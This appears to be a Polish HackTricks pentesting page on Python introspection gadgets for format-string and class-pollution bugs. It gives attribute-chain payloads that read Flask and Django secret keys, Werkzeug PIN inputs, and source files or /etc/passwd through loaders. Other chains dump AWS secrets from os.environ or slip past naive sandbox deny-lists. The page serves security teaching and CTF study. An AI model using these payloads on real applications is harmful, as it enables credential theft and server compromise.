# Gadżety do odczytu wewnętrznych danych Pythona

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Różne podatności, takie jak [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) lub [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogą umożliwić **odczyt wewnętrznych danych Pythona, ale nie pozwolą na wykonanie kodu**. Dlatego pentester będzie musiał maksymalnie wykorzystać te uprawnienia odczytu, aby **uzyskać wrażliwe uprawnienia i eskalować podatność**.

### Flask - Odczyt secret key

Strona główna aplikacji Flask prawdopodobnie będzie zawierać globalny obiekt **`app`**, w którym skonfigurowany jest ten **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
W tym przypadku możliwe jest uzyskanie dostępu do tego obiektu przy użyciu dowolnego gadgetu do **uzyskiwania dostępu do global objects** ze strony [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

W przypadku, gdy **vulnerability znajduje się w innym pliku python**, potrzebujesz gadgetu do przechodzenia przez pliki, aby dotrzeć do głównego pliku, uzyskać **dostęp do global object `app.secret_key`** i móc [**eskalować uprawnienia** dzięki znajomości tego klucza](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload taki jak ten [z tego writeupu](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Użyj tego payloadu, aby **odczytać `app.secret_key`**. Jeśli oryginalny bug zapewnia również primitive zapisu (na przykład class pollution), ta sama ścieżka może zostać użyta do zastąpienia go i podpisywania bardziej uprzywilejowanych cookies Flask.

### Werkzeug - machine_id i node uuid

[**Korzystając z tych payloadów z tego writeupu**](https://vozec.fr/writeups/tweedle-dum-dee/) uzyskasz dostęp do **machine_id** i węzła **uuid**, czyli **prywatnych danych** potrzebnych do [**wygenerowania Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i uzyskania dostępu do konsoli Pythona pod `/console`, jeśli **tryb debugowania jest włączony**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Pamiętaj, że możesz uzyskać **lokalną ścieżkę serwera do `app.py`**, generując pewien **błąd** na stronie internetowej, który **poda Ci tę ścieżkę**.

Jeśli vulnerability znajduje się w innym pliku Pythona, sprawdź wcześniejszy trik Flask, aby uzyskać dostęp do obiektów z głównego pliku Pythona.

### Django - SECRET_KEY i moduł settings

Obiekt ustawień Django jest buforowany w `sys.modules` po uruchomieniu aplikacji. Mając tylko read primitives, możesz uzyskać **`SECRET_KEY`**, klucze zapasowe, dane uwierzytelniające bazy danych lub sole podpisywania:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Jeśli podatny gadget znajduje się w innym module, najpierw przejrzyj globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` są równie cenne jak bieżący `SECRET_KEY`: nadal weryfikują stare podpisane wartości podczas rotacji.<sup>[[1]](#references)</sup> Ujawnij również `SESSION_ENGINE` i `SESSION_SERIALIZER`, aby szybko określić, czy wpływ ogranicza się tylko do fałszowania cookies, czy obejmuje coś silniejszego. Szczegółowe informacje o wpływie na web znajdziesz na [**stronie Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets ładowarki modułów - odczyt kodu źródłowego i plików

Załadowane moduły Python zwykle zachowują `__loader__`. Ładowarki oparte na plikach często udostępniają `get_source()` i `get_data()`, które są idealnymi **prymitywami tylko do odczytu**, gdy masz już dostęp do obiektu modułu, ale nie do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Jest to bardzo przydatne do zrzucania **modułów config, blueprintów, plików pomocniczych lub ukrytych routes** oraz odzyskiwania kluczy API, DSN-ów, ścieżek flag lub dodatkowych entry points gadgetów.

Jeśli masz tylko enumerację podklas, wyszukaj loader po nazwie zamiast hard-code’owania indeksu:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals ramki generatora / coroutine

Jeśli możesz utworzyć obiekt generatora/coroutine lub uzyskać do niego dostęp, jego ramka może ujawnić globals **bez potrzeby korzystania z jakiegokolwiek gadgetu funkcji `__globals__`**. Jest to przydatne przeciwko filtrom, które blokują tylko nazwy dunder i pomijają atrybuty ramki, takie jak `gi_frame`, `ag_frame`, `cr_frame` lub `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Gdy masz już globalne zmienne ramki, kontynuuj dokładnie tak jak w przypadku innych gadgets (`sys.modules`, obiektów settings, `os.environ` itd.). Ostatnie sandbox escapes wciąż na nowo odkrywają tę możliwość, ponieważ `gi_frame` i `f_globals` nie są atrybutami dunder i często pozostają dostępne po zastosowaniu naiwnych deny-list.

### Zmienne środowiskowe / dane uwierzytelniające cloud za pośrednictwem załadowanych modułów

Wiele jaili nadal importuje gdzieś `os` lub `sys`. Możesz wykorzystać dowolną osiągalną funkcję `__init__.__globals__`, aby przejść do już zaimportowanego modułu `os` i zrzucić **zmienne środowiskowe** zawierające API tokens, cloud keys lub flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Jeśli indeks podklasy jest filtrowany, użyj loaderów:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Zmienne środowiskowe często są jedynymi sekretami potrzebnymi do przejścia od read do full compromise (klucze cloud IAM, adresy URL baz danych, klucze podpisywania itp.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), affected versions `<0.61.0`) umożliwiał **class pollution** za pomocą spreparowanych żądań komponentów. Ścieżka właściwości taka jak `__init__.__globals__` mogła prowadzić do obiektów globalnych modułu komponentu i zaimportowanych modułów; advisory pokazuje nadpisanie `SECRET_KEY` Django oraz wartości w `os.environ`, a nie exploit tylko do odczytu.<sup>[[5]](#references)</sup> Jeśli odrębny bug zapewnia dostęp do odczytu tego samego grafu obiektów, te obiekty globalne mogą ujawniać konfigurację i dane uwierzytelniające bez konieczności wykonywania kodu.

### Gadget collections for chaining

Najnowsze CTF-y i badania nad pyjail pokazują niezawodne read chains budowane wyłącznie za pomocą dostępu do atrybutów i enumeracji podklas. Utrzymywane przez społeczność listy, takie jak [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogują setki minimalnych gadgets, które można łączyć w celu przechodzenia od obiektów do `__globals__`, `sys.modules`, a ostatecznie do wrażliwych danych.<sup>[[2]](#references)</sup> Preferuj wyszukiwanie oparte na **atrybutach/nazwach** zamiast surowych indeksów podklas, ponieważ pozycja `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itp. zmienia się między wersjami Pythona oraz wraz z dodatkowymi zaimportowanymi bibliotekami.

## References

- [1] [Dokumentacja podpisywania kryptograficznego Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki gadgets dla Python sandbox](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Luka Django-Unicorn Class Pollution prowadząca do RCE, XSS, DoS i Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
